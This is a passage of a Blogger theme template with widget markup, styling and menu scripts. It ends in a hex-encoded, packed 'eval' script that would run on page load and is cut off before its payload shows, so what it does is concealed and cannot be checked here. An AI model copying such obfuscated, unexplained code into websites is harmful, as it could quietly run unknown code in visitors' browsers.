&lt;div class=&quot;socialcounter&quot;&gt;&lt;ul class=&quot;social-counter&quot;&gt;&lt;li class=&quot;social_item-wrapper&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;social_item social_facebook&quot;&gt;&lt;i class=&quot;fa fa-facebook social_icon&quot;&gt;&lt;/i&gt;&lt;span class=&quot;social_num&quot;&gt;230,000&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;social_item-wrapper&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;social_item social_twitter&quot;&gt;&lt;i class=&quot;fa fa-twitter social_icon&quot;&gt;&lt;/i&gt;&lt;span class=&quot;social_num&quot;&gt;230,000&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;social_item-wrapper&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;social_item social_youtube&quot;&gt;&lt;i class=&quot;fa fa-youtube social_icon&quot;&gt;&lt;/i&gt;&lt;span class=&quot;social_num&quot;&gt;230,000&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;social_item-wrapper&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;social_item social_dribbble&quot;&gt;&lt;i class=&quot;fa fa-dribbble social_icon&quot;&gt;&lt;/i&gt;&lt;span class=&quot;social_num&quot;&gt;230,000&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;social_item-wrapper&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;social_item social_rss&quot;&gt;&lt;i class=&quot;fa fa-rss social_icon&quot;&gt;&lt;/i&gt;&lt;span class=&quot;social_num&quot;&gt;230,000&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;social_item-wrapper&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;social_item social_google-plus&quot;&gt;&lt;i class=&quot;fa fa-google-plus social_icon&quot;&gt;&lt;/i&gt;&lt;span class=&quot;social_num&quot;&gt;230,000&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;social_item-wrapper&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;social_item social_linkedin&quot;&gt;&lt;i class=&quot;fa fa-linkedin social_icon&quot;&gt;&lt;/i&gt;&lt;span class=&quot;social_num&quot;&gt;230,000&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li class=&quot;social_item-wrapper&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;social_item social_instagram&quot;&gt;&lt;i class=&quot;fa fa-instagram social_icon&quot;&gt;&lt;/i&gt;&lt;span class=&quot;social_num&quot;&gt;230,000&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

    <div class='clear'/>
 <!--b:include name='quickedit'/-->
</b:includable>
    </b:widget>
    <b:widget id='PopularPosts1' locked='false' title='Popular' type='PopularPosts' version='1'>
      <b:widget-settings>
        <b:widget-setting name='numItemsToShow'>5</b:widget-setting>
        <b:widget-setting name='showThumbnails'>true</b:widget-setting>
        <b:widget-setting name='showSnippets'>true</b:widget-setting>
        <b:widget-setting name='timeRange'>LAST_YEAR</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'><h2><data:title/></h2></b:if>
  <div class='widget-content popular-posts'>
    <ul>
      <b:loop values='data:posts' var='post'>
      <li>
        <b:if cond='!data:showThumbnails'>
          <b:if cond='!data:showSnippets'>
            <!-- (1) No snippet/thumbnail -->
            <a expr:href='data:post.href'><data:post.title/></a>
          <b:else/>
            <!-- (2) Show only snippets -->
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <div class='item-snippet'><data:post.snippet/></div>
          </b:if>
        <b:else/>
          <!-- (3) Show only thumbnails or (4) Snippets and thumbnails. -->
          <div expr:class='data:showSnippets ? &quot;item-content&quot; : &quot;item-thumbnail-only&quot;'>
            <b:if cond='data:post.featuredImage.isResizable or data:post.thumbnail'>
              <div class='item-thumbnail'>
                <a expr:href='data:post.href' target='_blank'>
                  <b:with value='data:post.featuredImage.isResizable                                  ? resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)                                  : data:post.thumbnail' var='image'>
                    <img border='0' expr:alt='data:post.title' expr:src='data:image'/>
                  </b:with>
                </a>
              </div>
            </b:if>
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <b:if cond='data:showSnippets'>
              <div class='item-snippet'><data:post.snippet/></div>
            </b:if>
          </div>
          <div style='clear: both;'/>
        </b:if>
      </li>
      </b:loop>
    </ul>
   <!--b:include name='quickedit'/-->
  </div>
</b:includable>
    </b:widget>
    <b:widget id='BlogArchive1' locked='false' title='Blog Archive' type='BlogArchive'>
      <b:widget-settings>
        <b:widget-setting name='showStyle'>HIERARCHY</b:widget-setting>
        <b:widget-setting name='yearPattern'>yyyy</b:widget-setting>
        <b:widget-setting name='showWeekEnd'>true</b:widget-setting>
        <b:widget-setting name='monthPattern'>MMMM</b:widget-setting>
        <b:widget-setting name='dayPattern'>MMM dd</b:widget-setting>
        <b:widget-setting name='weekPattern'>MM/dd</b:widget-setting>
        <b:widget-setting name='chronological'>false</b:widget-setting>
        <b:widget-setting name='showPosts'>true</b:widget-setting>
        <b:widget-setting name='frequency'>MONTHLY</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2><data:title/></h2>
  </b:if>
  <div class='widget-content'>
  <div id='ArchiveList'>
  <div expr:id='data:widget.instanceId + &quot;_ArchiveList&quot;'>
    <b:include cond='data:style == &quot;HIERARCHY&quot;' data='data' name='interval'/>
    <b:include cond='data:style == &quot;FLAT&quot;' data='data' name='flat'/>
    <b:include cond='data:style == &quot;MENU&quot;' data='data' name='menu'/>
  </div>
  </div>
  <b:include name='quickedit'/>
  </div>
</b:includable>
      <b:includable id='flat' var='data'>
  <ul class='flat'>
    <b:loop values='data:data' var='i'>
      <li class='archivedate'>
        <a expr:href='data:i.url'><data:i.name/></a> (<data:i.post-count/>)
      </li>
    </b:loop>
  </ul>
</b:includable>
      <b:includable id='interval' var='intervalData'>
  <b:loop values='data:intervalData' var='interval'>
    <ul class='hierarchy'>
      <li expr:class='&quot;archivedate &quot; + data:interval.expclass'>
        <b:include cond='data:interval.toggleId' data='interval' name='toggle'/>
        <a class='post-count-link' expr:href='data:interval.url'>
          <data:interval.name/>
        </a>
        <span class='post-count' dir='ltr'>(<data:interval.post-count/>)</span>
        <b:include cond='data:interval.data' data='interval.data' name='interval'/>
        <b:include cond='data:interval.posts' data='interval.posts' name='posts'/>
      </li>
    </ul>
  </b:loop>
</b:includable>
      <b:includable id='menu' var='data'>
  <select expr:id='data:widget.instanceId + &quot;_ArchiveMenu&quot;'>
    <option value=''><data:title/></option>
    <b:loop values='data:data' var='i'>
      <option expr:value='data:i.url'><data:i.name/> (<data:i.post-count/>)</option>
    </b:loop>
  </select>
</b:includable>
      <b:includable id='posts' var='posts'>
  <ul class='posts'>
    <b:loop values='data:posts' var='post'>
      <li><a expr:href='data:post.url'><data:post.title/></a></li>
    </b:loop>
  </ul>
</b:includable>
      <b:includable id='toggle' var='interval'>
  <a class='toggle' href='javascript:void(0)'>
    <span expr:class='&quot;zippy&quot; + (data:interval.expclass == &quot;expanded&quot; ? &quot; toggle-open&quot; : &quot;&quot;)'>
      <b:if cond='data:interval.expclass == &quot;expanded&quot;'>
        &#9660;&#160;
      <b:elseif cond='data:blog.languageDirection == &quot;rtl&quot;'/>
        &#9668;&#160;
      <b:else/>
        &#9658;&#160;
      </b:if>
    </span>
  </a>
</b:includable>
    </b:widget>
  </b:section>



    </div>
 <div style='clear: both;'/>
    </div>
    <!-- end content-wrapper -->
<div id='lower'>
<div class='row' id='lower-wrapper'>
<div id='lowerbar-wrapper'>
<b:section class='lowerbar ready-widget' id='Footer Widget (A)' preferred='yes'>
  <b:widget id='FollowByEmail1' locked='false' title='Follow by Email' type='FollowByEmail'>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'><h2 class='title'><data:title/></h2></b:if>
  <div class='widget-content'>
    <div class='follow-by-email-inner'>
      <form action='https://feedburner.google.com/fb/a/mailverify' expr:onsubmit='&quot;window.open(\&quot;https://feedburner.google.com/fb/a/mailverify?uri=&quot; + data:feedPath + &quot;\&quot;, \&quot;popupwindow\&quot;, \&quot;scrollbars=yes,width=550,height=520\&quot;); return true&quot;' method='post' target='popupwindow'>
        <table width='100%'>
          <tr>
            <td>
              <input class='follow-by-email-address' name='email' placeholder='Email address...' type='text'/>
            </td>
            <td width='64px'>
              <input class='follow-by-email-submit' type='submit' value='Submit'/>
            </td>
          </tr>
        </table>
        <input expr:value='data:feedPath' name='uri' type='hidden'/>
        <input name='loc' type='hidden' value='en_US'/>
      </form>
    </div>
  </div>
  <span class='item-control blog-admin'>
    <b:include name='quickedit'/>
  </span>
</b:includable>
  </b:widget>
  <b:widget id='HTML5' locked='false' title='Eva Blog' type='HTML' version='1'>
    <b:widget-settings>
      <b:widget-setting name='content'>&lt;p style=&quot;
    margin-bottom: 10px;
&quot;&gt;Over 600,000+ Readers Get fresh content from Eva&lt;/p&gt;
 &lt;ul class=&quot;social-icons icon-circle list-unstyled list-inline&quot;&gt; 
     
      
       
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-dribbble&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-dropbox&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-facebook&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-flickr&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
      
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-google-plus&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-instagram&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-linkedin&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-pinterest&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
      
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-skype&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
  
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-tumblr&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
    
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-twitter&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-vimeo-square&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-vk&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-youtube-play&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
&lt;style&gt;
.list-unstyled {
 padding-left: 0;
 list-style: none;
}
.list-inline li {
     display: inline-block;
    padding-right: 1px;
    padding-left: 1px;
    margin-bottom: 5px;
}
/*---- Genral classes end -------*/

/*Change icons size here*/
.social-icons .fa {
 font-size: 1.8em;
}
/*Change icons circle size and color here*/
.social-icons .fa {
 width: 40px;
 height: 40px;
 line-height: 40px;
 text-align: center;
 color: #FFF;
 color: rgba(255, 255, 255, 0.8);
 -webkit-transition: all 0.3s ease-in-out;
 -moz-transition: all 0.3s ease-in-out;
 -ms-transition: all 0.3s ease-in-out;
 -o-transition: all 0.3s ease-in-out;
 transition: all 0.3s ease-in-out;
}

.social-icons.icon-circle .fa{ 
 border: 1px solid #cccccc;
box-shadow: 2px 2px 0px rgba(0,0,0,0.05);
    border-radius: 3px;
}
.social-icons.icon-rounded .fa{
 
}
.social-icons.icon-flat .fa{
 
}

.social-icons .fa:hover, .social-icons .fa:active {
 -webkit-box-shadow: 1px 1px 3px #333;
 -moz-box-shadow: 1px 1px 3px #333;
 box-shadow: 1px 1px 3px #333; 
}

 
.social-icons .fa-adn{color:#504e54;} 
.social-icons .fa-apple{color:#aeb5c5;} 
.social-icons .fa-android{color:#A5C63B;}  
.social-icons .fa-bitbucket,.social-icons .fa-bitbucket-square{color:#003366;} 
.social-icons .fa-bitcoin,.social-icons .fa-btc{color:#F7931A;} 
.social-icons .fa-css3{color:#1572B7;} 
.social-icons .fa-dribbble{color:#F46899;}  
.social-icons .fa-dropbox{color:#018BD3;}
.social-icons .fa-facebook,.social-icons .fa-facebook-square{color:#3C599F;}  
.social-icons .fa-flickr{color:#FF0084;}
.social-icons .fa-foursquare{color:#0086BE;}
.social-icons .fa-github,.social-icons .fa-github-alt,.social-icons .fa-github-square{color:#070709;} 
.social-icons .fa-google-plus,.social-icons .fa-google-plus-square{color:#CF3D2E;} 
.social-icons .fa-html5{color:#E54D26;}
.social-icons .fa-instagram{color:#A1755C;}
.social-icons .fa-linkedin,.social-icons .fa-linkedin-square{color:#0085AE;} 
.social-icons .fa-linux{color:#FBC002;color:#333;}
.social-icons .fa-maxcdn{color:#F6AE1C;}
.social-icons .fa-pagelines{color:#241E20;color:#3984EA;}
.social-icons .fa-pinterest,.social-icons .fa-pinterest-square{color:#CC2127;} 
.social-icons .fa-renren{color:#025DAC;}
.social-icons .fa-skype{color:#01AEF2;}
.social-icons .fa-stack-exchange{color:#245590;}
.social-icons .fa-stack-overflow{color:#FF7300;}
.social-icons .fa-trello{color:#265A7F;}
.social-icons .fa-tumblr,.social-icons .fa-tumblr-square{color:#314E6C;} 
.social-icons .fa-twitter,.social-icons .fa-twitter-square{color:#32CCFE;} 
.social-icons .fa-vimeo-square{color:#229ACC;}
.social-icons .fa-vk{color:#375474;}
.social-icons .fa-weibo{color:#D72B2B;}
.social-icons .fa-windows{color:#12B6F3;}
.social-icons .fa-xing,.social-icons .fa-xing-square{color:#00555C;} 
.social-icons .fa-youtube,.social-icons .fa-youtube-play,.social-icons .fa-youtube-square{color:#C52F30;}
&lt;/style&gt;</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>
  <!--b:include name='quickedit'/-->
</b:includable>
  </b:widget>
</b:section>
</div>
<div class='lower-bod' id='lowerbar-wrapper'>
<b:section class='lowerbar ready-widget' id='Footer Widget (B)' preferred='yes'>
  <b:widget id='HTML1' locked='false' title='Latest Tweets' type='HTML'>
    <b:widget-settings>
      <b:widget-setting name='content'><![CDATA[<div class='clients-wrap' id='twitter-feed'></div>]]></b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
  </b:widget>
</b:section>
</div>
<div id='lowerbar-wrapper'>
<b:section class='lowerbar ready-widget' id='Footer Widget (c)' preferred='yes'>
  <b:widget id='HTML3' locked='false' title='Recent Post' type='HTML'>
    <b:widget-settings>
      <b:widget-setting name='content'>&lt;div class=&quot;recentpoststyle&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function showlatestposts(e) {
    for (var t = 0; t &lt; posts_no; t++) {
        var r, s = e.feed.entry[t],
            n = s.title.$t;
        if (t == e.feed.entry.length) break;
        for (var a = 0; a &lt; s.link.length; a++)
            if (&quot;alternate&quot; == s.link[a].rel) {
                r = s.link[a].href;
                break
            }
        n = n.link(r);
        var i = &quot;... read more&quot;;
        i = i.link(r);
        var l = s.published.$t,
            o = l.substring(0, 4),
            u = l.substring(5, 7),
            c = l.substring(8, 10),
            m = new Array;
        if (m[1] = &quot;Jan&quot;, m[2] = &quot;Feb&quot;, m[3] = &quot;Mar&quot;, m[4] = &quot;Apr&quot;, m[5] = &quot;May&quot;, m[6] = &quot;Jun&quot;, m[7] = &quot;Jul&quot;, m[8] = &quot;Aug&quot;, m[9] = &quot;Sep&quot;, m[10] = &quot;Oct&quot;, m[11] = &quot;Nov&quot;, m[12] = &quot;Dec&quot;, &quot;content&quot; in s) var d = s.content.$t;
        else if (&quot;summary&quot; in s) var d = s.summary.$t;
        else var d = &quot;&quot;;
        var v = /&lt;\S[^&gt;]*&gt;/g;
        if (d = d.replace(v, &quot;&quot;), 1 == posts_date &amp;&amp; document.write(&#39;&lt;div class=&quot;post-date&quot;&gt;&#39; + m[parseInt(u, 10)] + &quot; &quot; + c + &quot; &quot; + o + &quot;&lt;/div&gt;&quot;), document.write(&#39;&lt;li class=&quot;recent-post-title&quot;&gt;&#39;), document.write(n), document.write(&#39;&lt;/li&gt;&lt;div class=&quot;recent-post-summ&quot;&gt;&#39;), 1 == post_summary)
            if (d.length &lt; summary_chars) document.write(d);
            else {
                d = d.substring(0, summary_chars);
                var f = d.lastIndexOf(&quot; &quot;);
                d = d.substring(0, f), document.write(d + &quot; &quot; )
            }
        document.write(&quot;&lt;/div&gt;&quot;)
    }
}
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var posts_no = 2;
var posts_date = true;
var post_summary = true;
var summary_chars = 80;
&lt;/script&gt;
&lt;script src=&quot;/feeds/posts/default?orderby=published&amp;amp;alt=json-in-script&amp;amp;callback=showlatestposts&quot;&gt;
&lt;/script&gt;
&lt;style type=&quot;text/css&quot;&gt;
.recentpoststyle {
    list-style-type: none;
}
.recentpoststyle a {
    text-decoration: none;
    color: #49A8D1;
}
.recentpoststyle a:hover {
    color: #000;
}
.recentpoststyle li:before {
    float: left;
    z-index: 1;
    position: relative;
    font-size: 15px;
    font-weight: bold;
    color: #fff;
    background: #69B7E2;
    margin: 13px 5px 0px -6px;
    line-height: 30px;
    width: 30px;
    height: 30px;
    text-align: center;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    border-radius: 50%;
}
li.recent-post-title {
    margin: 7px 0;
    padding: 0;
}
.recent-post-title a {
    color: #444;
    text-decoration: none;
    font: 600 13px &#39;Montserrat&#39;;
}
.post-date {
    font-size: 11px;
    color: #999;
    margin:0;
}
.recent-post-summ {
    color: #777;
    padding: 0 0 15px;
    margin-bottom: 15px;
    font: 15px &#39;Open Sans&#39;, sans-serif;
    border-bottom: 1px solid #ececec;
}
&lt;/style&gt;&lt;/div&gt;</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
  </b:widget>
  <b:widget id='Label1' locked='false' title='Tags' type='Label' version='1'>
    <b:widget-settings>
      <b:widget-setting name='sorting'>ALPHA</b:widget-setting>
      <b:widget-setting name='display'>CLOUD</b:widget-setting>
      <b:widget-setting name='selectedLabelsList'/>
      <b:widget-setting name='showType'>ALL</b:widget-setting>
      <b:widget-setting name='showFreqNumbers'>false</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
        <b:loop values='data:labels' var='label'>
          <li>
            <b:if cond='data:blog.url == data:label.url'>
              <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
            <b:else/>
              <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
            </b:if>
            <b:if cond='data:showFreqNumbers'>
              <span dir='ltr'>(<data:label.count/>)</span>
            </b:if>
          </li>
        </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
   <div class='clear'/>
 <!--b:include name='quickedit'/-->
  </div>
</b:includable>
  </b:widget>
</b:section>
</div>
<div style='clear: both;'/>
</div>
</div>
<div id='jugas_footer'>
        <div class='copy-container row'>
         
                    <div class='jugas_footer_copyright' itemscope='itemscope' itemtype='http://schema.org/WPFooter'>
                        Designed with <i aria-hidden='true' class='fa fa-heart' style='color: red;'></i> by <a href='http://www.way2themes.com/' id='mycontent' title='Blogger Templates' rel='dofollow'>Way2Themes</a> | Distributed by <a href='https://gooyaabitemplates.com/' rel='dofollow' target='_blank' style='color:#00a68e;'>Gooyaabi Templates</a>
                    </div>
               <b:section class='bottom-bar-social blue' id='Footer social widget' maxwidgets='1' name='Footer Social Widget' showaddelement='no'>
                 <b:widget id='LinkList236' locked='true' title='Social Media Icons' type='LinkList' version='1'>
                   <b:widget-settings>
                     <b:widget-setting name='link-7'>#</b:widget-setting>
                     <b:widget-setting name='link-5'>#</b:widget-setting>
                     <b:widget-setting name='link-6'>#</b:widget-setting>
                     <b:widget-setting name='link-3'>#</b:widget-setting>
                     <b:widget-setting name='link-4'>#</b:widget-setting>
                     <b:widget-setting name='text-1'>facebook</b:widget-setting>
                     <b:widget-setting name='text-0'>twitter</b:widget-setting>
                     <b:widget-setting name='text-3'>instagram</b:widget-setting>
                     <b:widget-setting name='text-2'>gplus</b:widget-setting>
                     <b:widget-setting name='text-5'>email</b:widget-setting>
                     <b:widget-setting name='text-4'>rss</b:widget-setting>
                     <b:widget-setting name='text-7'>pinterest</b:widget-setting>
                     <b:widget-setting name='text-6'>youtube</b:widget-setting>
                     <b:widget-setting name='sorting'>NONE</b:widget-setting>
                     <b:widget-setting name='link-1'>#</b:widget-setting>
                     <b:widget-setting name='link-2'>#</b:widget-setting>
                     <b:widget-setting name='link-0'>#</b:widget-setting>
                   </b:widget-settings>
                   <b:includable id='main'>
            <div class='widget-content'>
              <ul id='social'>
                <b:loop values='data:links' var='link'>
                  <li><a expr:class='data:link.name' expr:href='data:link.target' expr:title='data:link.name'/></li>
                </b:loop>
              </ul>
            </div>
          </b:includable>
                 </b:widget>
               </b:section>
              
                    
        </div>
    </div>
&lt;/div&gt;
<script type='text/javascript'>
//<![CDATA[

// Plugin: SelectNav.js ~ url: https://github.com/lukaszfiszer/selectnav.js
window.selectnav=function(){"use strict";var e=function(e,t){function c(e){var t;if(!e)e=window.event;if(e.target)t=e.target;else if(e.srcElement)t=e.srcElement;if(t.nodeType===3)t=t.parentNode;if(t.value)window.location.href=t.value}function h(e){var t=e.nodeName.toLowerCase();return t==="ul"||t==="ol"}function p(e){for(var t=1;document.getElementById("selectnav"+t);t++);return e?"selectnav"+t:"selectnav"+(t-1)}function d(e){a++;var t=e.children.length,n="",l="",c=a-1;if(!t){return}if(c){while(c--){l+=o}l+=" "}for(var v=0;v<t;v++){var m=e.children[v].children[0];if(typeof m!=="undefined"){var g=m.innerText||m.textContent;var y="";if(r){y=m.className.search(r)!==-1||m.parentNode.className.search(r)!==-1?f:""}if(i&&!y){y=m.href===document.URL?f:""}n+='<option value="'+m.href+'" '+y+">"+l+g+"</option>";if(s){var b=e.children[v].children[1];if(b&&h(b)){n+=d(b)}}}}if(a===1&&u){n='<option value="">'+u+"</option>"+n}if(a===1){n='<select class="selectnav" id="'+p(true)+'">'+n+"</select>"}a--;return n}e=document.getElementById(e);if(!e){return}if(!h(e)){return}if(!("insertAdjacentHTML"in window.document.documentElement)){return}document.documentElement.className+=" js";var n=t||{},r=n.activeclass||"active",i=typeof n.autoselect==="boolean"?n.autoselect:true,s=typeof n.nested==="boolean"?n.nested:true,o=n.indent||"-",u=n.label||"Menu",a=0,f=" selected ";e.insertAdjacentHTML("afterend",d(e));var l=document.getElementById(p());if(l.addEventListener){l.addEventListener("change",c)}if(l.attachEvent){l.attachEvent("onchange",c)}return l};return function(t,n){e(t,n)}}();

// jquery replacetext plugin https://github.com/cowboy/jquery-replacetext
(function(e){e.fn.replaceText=function(t,n,r){return this.each(function(){var i=this.firstChild,s,o,u=[];if(i){do{if(i.nodeType===3){s=i.nodeValue;o=s.replace(t,n);if(o!==s){if(!r&&/</.test(o)){e(i).before(o);u.push(i)}else{i.nodeValue=o}}}}while(i=i.nextSibling)}u.length&&e(u).remove()})}})(jQuery);

function makemeSticky(e){function t(){var e=s.getBoundingClientRect();e.top<0?(n.className=a+" makesticking",n.style.width=i+"px"):n.className=a}var n=document.getElementById(e),s=document.createElement("div");n.parentNode.insertBefore(s,n);var i=n.offsetWidth,a=n.className+" makesticky";window.addEventListener("scroll",t,!1)}makemeSticky("stickymenu");

var _ERqufT= "\x65\x76\x61\x6c\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x70\x2c\x61\x2c\x63\x2c\x6b\x2c\x65\x2c\x64\x29\x7b\x65\x3d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x63\x29\x7b\x72\x65\x74\x75\x72\x6e\x28\x63\x3c\x61\x3f\x27\x27\x3a\x65\x28\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x63\x2f\x61\x29\x29\x29\x2b\x28\x28\x63\x3d\x63\x25\x61\x29\x3e\x33\x35\x3f\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x63\x2b\x32\x39\x29\x3a\x63\x2e\x74\x6f\x53\x74\x72\x69\x6e\x67\x28\x33\x36\x29\x29\x7d\x3b\x69\x66\x28\x21\x27\x27\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x2f\x5e\x2f\x2c\x53\x74\x72\x69\x6e\x67\x29\x29\x7b\x77\x68\x69\x6c\x65\x28\x63\x2d\x2d\x29\x7b\x64\x5b\x65\x28\x63\x29\x5d\x3d\x6b\x5b\x63\x5d\x7c\x7c\x65\x28\x63\x29\x7d\x6b\x3d\x5b\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x65\x29\x7b\x72\x65\x74\x75\x72\x6e\x20\x64\x5b\x65\x5d\x7d\x5d\x3b\x65\x3d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x72\x65\x74\x75\x72\x6e\x27\x5c\x5c\x77\x2b\x27\x7d\x3b\x63\x3d\x31\x7d\x3b\x77\x68\x69\x6c\x65\x28\x63\x2d\x2d\x29\x7b\x69\x66\x28\x6b\x5b\x63\x5d\x29\x7b\x70\x3d\x70\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x6e\x65\x77\x20\x52\x65\x67\x45\x78\x70\x28\x27\x5c\x5c\x62\x27\x2b\x65\x28\x63\x29\x2b\x27\x5c\x5c\x62\x27\x2c\x27\x67\x27\x29\x2c\x6b\x5b\x63\x5d\x29\x7d\x7d\x72\x65\x74\x75\x72\x6e\x20\x70\x7d\x28\x27\x31\x4b\x20\x31\x35\x3d\x5b\x22\x5c\x5c\x51\x5c\x5c\x64\x5c\x5c\x65\x5c\x5c\x45\x5c\x5c\x63\x5c\x5c\x62\x5c\x5c\x65\x5c\x5c\x31\x37\x5c\x5c\x64\x5c\x5c\x6f\x5c\x5c\x64\x5c\x5c\x51\x5c\x5c\x63\x5c\x5c\x79\x5c\x5c\x45\x5c\x5c\x66\x5c\x5c\x59\x5c\x5c\x77\x5c\x5c\x6b\x5c\x5c\x65\x5c\x5c\x6d\x5c\x5c\x71\x5c\x5c\x77\x5c\x5c\x39\x5c\x5c\x39\x5c\x5c\x6d\x5c\x5c\x76\x5c\x5c\x77\x5c\x5c\x39\x5c\x5c\x39\x5c\x5c\x72\x5c\x5c\x51\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x31\x30\x5c\x5c\x31\x34\x5c\x5c\x39\x5c\x5c\x63\x5c\x5c\x62\x5c\x5c\x31\x77\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x75\x5c\x5c\x39\x5c\x5c\x63\x5c\x5c\x62\x5c\x5c\x31\x77\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x44\x5c\x5c\x39\x5c\x5c\x63\x5c\x5c\x62\x5c\x5c\x65\x5c\x5c\x31\x67\x5c\x5c\x64\x5c\x5c\x6f\x5c\x5c\x64\x5c\x5c\